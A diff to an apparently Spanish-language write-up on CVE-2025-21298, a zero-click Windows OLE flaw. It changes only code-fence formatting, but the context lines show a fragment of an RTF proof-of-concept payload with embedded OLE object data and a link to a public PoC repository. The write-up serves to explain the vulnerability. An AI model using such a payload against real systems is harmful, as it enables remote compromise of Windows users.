@@ -45,7 +45,7 @@ CVE-2025-21298 es una **vulnerabilidad de zero-click** in Windows OLE donde el a
 
 > https://github.com/ynwarcs/CVE-2025-21298
 
-```rtf
+```
 {\rtf1{\object\objhtml\objw1\objh1\objupdate\rsltpict{\*\objclass None}{\*\objdata 0105000002000000
 0a000000
 53746174696344696200
@@ -61,6 +61,7 @@ aa00
 00000000
 }
 }}
+
 ```
 
 
